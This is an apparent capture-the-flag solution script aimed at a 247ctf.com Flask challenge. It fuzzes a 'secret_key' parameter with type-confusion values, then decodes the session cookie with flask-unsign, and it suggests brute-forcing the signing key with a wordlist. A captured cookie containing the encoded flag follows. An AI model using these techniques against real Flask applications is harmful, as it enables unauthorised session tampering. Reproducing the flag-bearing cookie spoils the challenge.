
```python
import requests
import sys

def exploit(url):
    session = requests.Session()
    response = session.get(f"{url}/flag", params={"secret_key": "0"})
    print(f"[+] Server response: {response.text}")
    cookie = session.cookies.get("session")
    if not cookie:
        print("[-] No session cookie received!")
        return
    print(f"[+] Session cookie: {cookie}")
    print("\n[+] Trying type confusion exploit...")
    edge_cases = [
        "0",  # string zero
        "0.0",  # float as string
        "-0",  # negative zero
        "None",  # None as string
        "",  # empty string
        " ",  # space
        "true",  # boolean as string
        "false",
        "null",  # null as string
        "undefined",  # JavaScript concept
        "NaN",  # Not a Number
        "\x00",  # null byte
        "\x00" * 24,  # 24 null bytes (same length as os.urandom(24))
    ]
    for case in edge_cases:
        response = session.get(f"{url}/flag", params={"secret_key": case})
        if response.text != "Incorrect secret key!":
            print(f"[+] Found match with {case}!")
            print(f"[+] Response: {response.text}")
            return True
    print("\n[+] Direct exploit attempts failed.")
    print("[+] Since this is a CTF, you likely need to use flask-unsign:")
    print(f"    pip install flask-unsign")
    print(f"    flask-unsign --decode --cookie \"{cookie}\"")
    print("\n[+] Trying extreme integer values...")
    extreme_values = [
        "-1",  # negative one
        "1",  # one
        str(sys.maxsize),  # max integer
        str(-sys.maxsize - 1),  # min integer
        "9" * 100,  # very large number
        "-" + "9" * 100,  # very large negative
        "0" * 100,  # many zeros
    ]
    for value in extreme_values:
        response = session.get(f"{url}/flag", params={"secret_key": value})
        if response.text != "Incorrect secret key!":
            print(f"[+] Found match with {value}!")
            print(f"[+] Response: {response.text}")
            return True
    print("\n[+] For a complete exploit, you would need to:")
    print("1. Extract the session cookie (done)")
    print("2. Decode the session cookie using flask-unsign (requires the tool)")
    print("3. The flag should be in the decoded session data")
    return cookie

if __name__ == "__main__":
    url = "https://94b27d00bc540fe4.247ctf.com"
    if len(sys.argv) > 1:
        url = sys.argv[1]
    print(f"[+] Targeting: {url}")
    cookie = exploit(url)
    if cookie:
        print("\n[+] To extract the flag from the session cookie:")
        print(f"1. Install flask-unsign: pip install flask-unsign")
        print(f"2. Decode the cookie: flask-unsign --decode --cookie \"{cookie}\"")
        print(f"3. The flag should be in the decoded output")
        print(f"\n[+] If needed, try to brute force the key:")
        print(f"flask-unsign --unsign --cookie \"{cookie}\" --wordlist your_wordlist.txt")
```

```bash
flask-unsign --decode --cookie "eyJmbGFnIjp7IiBiIjoiTWpRM1ExUkdlMlJoT0RBM09UVm1PR0UxWTJGaU1tVXdNemRrTnpNNE5UZ3dOMkk1WVRreGZRPT0ifX0.Z-sXgw.9TA5k6rXYJnds8KuXaQzypSsIoo"
```
